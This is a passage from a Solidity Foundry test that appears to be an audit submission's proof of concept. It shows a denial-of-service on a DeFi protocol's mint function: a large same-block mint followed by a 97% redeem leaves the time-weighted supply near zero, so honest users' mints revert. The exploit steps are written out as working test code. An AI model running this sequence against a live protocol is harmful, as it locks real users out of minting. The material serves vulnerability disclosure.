nt = new Covenant(address(this));\n        lex = new LatentSwapLEX(\n            address(this),\n            address(covenant),\n            P_MAX,\n            P_MIN,\n            P_LIM_H,\n            P_LIM_MAX,\n            LN_RATE_BIAS,\n            DURATION,\n            SWAP_FEE\n        );\n\n        covenant.setEnabledLEX(address(lex), true);\n        covenant.setEnabledCurator(_mockOracle, true);\n\n        _marketParams = MarketParams({\n            baseToken:  _mockBaseAsset,\n            quoteToken: _mockQuoteAsset,\n            curator:    _mockOracle,\n            lex:        address(lex)\n        });\n        _marketId = covenant.createMarket(_marketParams, hex\"\");\n\n        // Optional extra oracles from template (not used in PoC)\n        covenantCurator = new CovenantCurator(address(this));\n        covenantCuratorOracle = new StubPriceOracle();\n        covenantCurator.govSetConfig(_mockBaseAsset, _mockQuoteAsset, address(covenantCuratorOracle));\n        chainlinkAggregator = new MockChainlinkAggregator(8);\n        chainlinkOracle = new ChainlinkOracle(_mockBaseAsset, _mockQuoteAsset, address(chainlinkAggregator), 1 hours);\n        pyth = new MockPyth();\n        pythOracle = new PythOracle(address(pyth), _mockBaseAsset, _mockQuoteAsset, bytes32(uint256(196)), 10 minutes, 250);\n\n        // Sanity: LEX configured\n        LexConfig memory cfg = lex.getLexConfig(_marketId);\n        assertTrue(cfg.aToken != address(0) && cfg.zToken != address(0), \"LEX not initialized\");\n    }\n\n    /// -----------------------------------------------------------------------\n    /// PoC B: “Mint DoS via ETWAP lag” (no price move; just ETWAP dynamics)\n    ///\n    /// 1) Attacker mints big in first block → ETWAP ≈ 0\n    /// 2) Immediately redeems ~97% in the same block (leave supply ABOVE bootstrap threshold)\n    /// 3) Honest user tries a normal mint → reverts E_LEX_MintCapExceeded()\n    ///    because cap uses tiny ETWAP while bootstrap is OFF (supply > threshold)\n    /// 4) After time passes, the same mint succeeds (ETWAP caught up inside mint call)\n    /// -----------------------------------------------------------------------\n    function test_submissionValidity() public {\n        LexConfig memory cfg = lex.getLexConfig(_marketId);\n        uint256 noCapThreshold = uint256(1) << cfg.noCapLimit; // 2^noCapLimit\n\n        // ============ Attacker approvals ============\n        vm.startPrank(attacker);\n        IERC20(_mockBaseAsset).approve(address(covenant), type(uint256).max);\n\n        // ============ 1) Huge first mint (ETWAP still ~0) ============\n        uint256 bigMint = 100e18;\n        (uint256 a1, uint256 z1) = _mint(attacker, bigMint);\n\n        // Supply grew\n        MarketState memory ms1 = covenant.getMarketState(_marketId);\n        assertGt(ms1.baseSupply, bigMint / 2, \"baseSupply didn't grow\");\n\n        // ETWAP is still ~0 in the same block\n        LexState memory st1 = lex.getLexState(_marketId);\n        assertEq(st1.lastETWAPBaseSupply, 0, \"ETWAP should be ~0 right after first mint in same block\");\n\n        // ============ 2) Redeem ~97% immediately (same block) ============\n        // We leave ~3e18 supply which is > typical 2^noCapLimit (~1.15e18 with noCapLimit=60)\n        uint256 aBal = IERC20(cfg.aToken).balanceOf(attacker);\n        uint256 zBal = IERC20(cfg.zToken).balanceOf(attacker);\n        assertGt(aBal, 0);\n        assertGt(zBal, 0);\n\n        uint256 aIn = (aBal * 97) / 100; // NOT full redeem; leave dust & keep above threshold\n        uint256 zIn = (zBal * 97) / 100;\n\n        uint256 baseOut = _redeem(attacker, aIn, zIn);\n        (baseOut); // silence\n\n        MarketState memory ms2 = covenant.getMarketState(_marketId);\n        assertGt(ms2.baseSupply, noCapThreshold, \"post-supply dropped below bootstrap threshold (should be above)\");\n\n        // ETWAP still ~0 (same block)\n        LexState memory st2 = lex.getLexState(_marketId);\n        assertEq(st2.lastETWAPBaseSupply, 0, \"ETWAP should still be ~0 (no elapsed time)\");\n\n        vm.stopPrank();\n\n        // ============ 3) Honest user tries to mint → should revert by mint cap ============\n        vm.startPrank(user);\n        IERC20(_mockBaseAsset).approve(address(covenant), type(uint256).max);\n\n        uint256 userMint = 10e18;\n        // Because current supply > noCapThreshold, bootstrap no-cap is OFF,\n        // and ETWAP ~ 0, the mint cap enforces post ≤ 2×ETWAP → essentially 0\n        vm.expectRevert(abi.encodeWithSignature(\"E_LEX_MintCapExceeded()\"));\n        _mint(user, userMint);\n        vm.stopPrank();\n\n        // After attacker’s yo-yo:\n        for (uint i = 0; i < 6; i++) {\n            vm.warp(block.timestamp + 5 minutes);             // small time steps\n            covenant.updateState(_marketId, _marketParams, hex\"\", 0);  // touch market so accrual runs\n            vm.startPrank(user);\n            vm.expectRevert(abi.encodeWithSignature(\"E_LEX_MintCapExceeded()\"));\n            _mint(user, 1e18);                                 // honest, reasonable mint\n            vm.stopPrank();\n        }\n    }\n\n    // ----------------- helpers -----------------\n\n    function _mint(address to, uint256 baseAmountIn) internal returns (uint256 aOut, uint256 zOut) {\n        MintParams memory mp = MintParams({\n            marketId: _marketId,\n            marketParams: _marketParams,\n            baseAmountIn: baseAmountIn,\n            to: to,\n            minATokenAmountOut: 0,\n            minZTokenAmountOut: 0,\n            data: hex\"\",     // no oracle payload needed for MockOracle\n            msgValue: 0\n        });\n        (aOut, zOut) = covenant.mint(mp);\n    }\n\n    function _redeem(address to, uint256 aTokenIn, uint256 zTokenIn) internal returns (uint256 baseOut) {\n        RedeemParams memory rp = RedeemParams({\n            marketId: _marketId,\n            marketParams: _marketParams,\n            aTokenAmountIn: aTokenIn,\n            zTokenAmountIn: zTokenIn,\n            to: to,\n            minAmountOut: 0,\n            data: hex\"\",\n            msgValue: 0\n        });\n        baseOut = covenant.redeem(rp);\n    }\n}",
